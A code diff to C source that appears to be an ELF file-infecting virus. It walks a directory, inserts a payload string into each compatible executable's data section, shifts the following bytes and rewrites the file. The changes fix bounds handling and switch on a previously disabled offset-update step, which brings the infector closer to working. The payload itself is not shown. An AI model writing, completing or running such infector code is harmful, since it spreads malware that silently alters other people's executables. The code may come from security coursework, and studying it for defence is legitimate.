@@ -157,12 +157,13 @@ static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
   size_t  j;
   char    *tmp;
   size_t  toAdd;
+  size_t  total;
 
   i = file.size;
   tmp = (char *)file.header;
   toAdd = strlen(payload) + 1;
-  while (file.size - (dataHeader->sh_offset + dataHeader->sh_size) != i) {
-    dprintf(1, "%zu, %zu\n", file.size - (dataHeader->sh_offset + dataHeader->sh_size), i);
+  total = file.size - (dataHeader->sh_offset + dataHeader->sh_size);
+  while (total != i) {
     tmp[i + toAdd] = tmp[i];
     i -= 1;
   }
@@ -181,15 +182,14 @@ static int  infectFile(const char *dirname, struct dirent *file) {
 
   if (mapFile(dirname, file->d_name, &header) == -1)
     return (0);
-  if (!isCompatible(header.header->e_ident, header.header->e_machine))
+  if ((size_t)(header.size) < sizeof(Elf64_Ehdr) || !isCompatible(header.header->e_ident, header.header->e_machine))
     return (0);
   dprintf(1, "File %s is compatible\n", file->d_name);
   data = getDataSectionHeader(header.header);
   data->sh_size += strlen(payload);
   appendSignature(header, data);
   dprintf(1, "Changed data name\n");
-  (void)updateOffsets;
-  /* updateOffsets(header.header, data->sh_offset, strlen(payload)); */
+  updateOffsets(header.header, data->sh_offset, strlen(payload));
   writeToFile(dirname, file->d_name, header);
   return (0);
 }
